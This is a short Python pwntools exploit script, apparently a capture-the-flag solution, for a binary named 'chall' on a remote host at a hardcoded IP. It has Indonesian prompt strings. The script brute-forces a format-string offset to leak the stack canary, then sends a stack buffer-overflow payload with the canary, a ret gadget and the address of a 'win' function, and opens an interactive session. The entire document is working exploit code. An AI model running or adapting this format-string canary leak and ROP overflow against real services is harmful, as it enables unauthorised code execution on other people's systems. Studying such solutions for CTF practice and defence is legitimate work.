from pwn import *

context.clear(arch='amd64')

elf = ELF('./chall')

WIN = elf.symbols['win']
RET = ROP(elf).find_gadget(['ret'])[0]
PAD = 72

for offset in range(6, 40):
    p = remote('54.151.244.93', 9999)
    p.sendlineafter(b'nama lengkapmu: ', f'%{offset}$lx'.encode())
    p.recvuntil(b'Halo, ')
    val = p.recvline().strip()
    if len(val) == 16 and val.endswith(b'00'):
        break
    p.close()
else:
    log.error('Offset canary tidak ketemu')

canary = int(val, 16)
log.success(f'Offset: {offset}, Canary: {hex(canary)}')

payload = flat({
    0: b'A' * PAD,
    PAD: p64(canary),
    PAD + 8: b'B' * 8,
    PAD + 16: p64(RET),
    PAD + 24: p64(WIN),
})
p.sendlineafter(b'username ctfmu: ', payload)

p.interactive()
